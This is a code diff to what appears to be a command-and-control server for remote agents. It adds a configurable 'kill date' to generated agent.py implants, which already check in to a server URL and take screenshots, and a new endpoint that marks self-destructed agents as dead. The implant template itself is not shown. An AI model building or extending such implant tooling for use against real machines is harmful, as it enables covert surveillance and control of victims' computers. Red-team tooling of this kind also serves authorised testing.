@@ -407,11 +407,25 @@ def init_api_routes(app, socketio):
             agents_dir = os.path.join(app.root_path, 'agents')
             os.makedirs(agents_dir, exist_ok=True)
 
+            # Process kill date if enabled
+            killdate_enabled = bool(data.get('enable_killdate', False))
+            killdate_value = ""
+            if killdate_enabled and data.get('killdate'):
+                try:
+                    # Convert from ISO format (YYYY-MM-DDTHH:MM) to our desired format (YYYY-MM-DD HH:MM)
+                    dt = datetime.strptime(data['killdate'], "%Y-%m-%dT%H:%M")
+                    killdate_value = dt.strftime("%Y-%m-%d %H:%M")
+                except ValueError as e:
+                    app.logger.warning(f"Invalid kill date format: {str(e)}")
+                    killdate_enabled = False
+
             config = {
                 'checkin_interval': max(5, min(int(data.get('checkin_interval', 10)), 3600)),
                 'server_url': data.get('server_url', request.url_root).strip('/'),
                 'take_screenshots': bool(data.get('take_screenshots', True)),
-                'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100))
+                'screenshot_frequency': max(1, min(int(data.get('screenshot_frequency', 10)), 100)),
+                'killdate_enabled': killdate_enabled,
+                'killdate': killdate_value if killdate_enabled else ""
             }
 
             template_path = os.path.join(app.root_path, 'templates', 'agent_template.py')
@@ -425,7 +439,9 @@ def init_api_routes(app, socketio):
                 checkin_interval=config['checkin_interval'],
                 server_url=config['server_url'],
                 take_screenshots=str(config['take_screenshots']),
-                screenshot_frequency=config['screenshot_frequency']
+                screenshot_frequency=config['screenshot_frequency'],
+                killdate_enabled=str(config['killdate_enabled']),
+                killdate=config['killdate'] if config['killdate_enabled'] else ""
             )
 
             agent_path = os.path.join(agents_dir, 'agent.py')
@@ -475,6 +491,47 @@ def init_api_routes(app, socketio):
             return jsonify({"status": "success"})
             
         except Exception as e:
+            if conn:
+                conn.rollback()
+            return jsonify({"status": "error", "message": str(e)}), 500
+        finally:
+            if conn:
+                conn.close()
+
+
+    @app.route('/api/killdate_reached', methods=['POST'])
+    def killdate_reached():
+        conn = None
+        try:
+            if not request.data:
+                return jsonify({"status": "error", "message": "No data provided"}), 400
+                
+            data = SecureComms.decrypt(request.data)
+            if not data or 'agent_id' not in data:
+                return jsonify({"status": "error", "message": "Invalid data format"}), 400
+                
+            app.logger.info(f"Killdate reached for agent {data['agent_id']}")
+            
+            conn = sqlite3.connect(CONFIG.database)
+            c = conn.cursor()
+            
+            # Mark agent as dead in database
+            c.execute('''UPDATE agents SET status='dead' WHERE id=?''',
+                    (data['agent_id'],))
+            
+            conn.commit()
+            
+            # Notify clients
+            socketio.emit('agent_dead', {
+                'agent_id': data['agent_id'],
+                'message': 'Killdate reached - agent self-destructed',
+                'timestamp': data.get('timestamp', '')
+            })
+            
+            return jsonify({"status": "success"})
+            
+        except Exception as e:
+            app.logger.error(f"Error processing killdate: {str(e)}")
             if conn:
                 conn.rollback()
             return jsonify({"status": "error", "message": str(e)}), 500
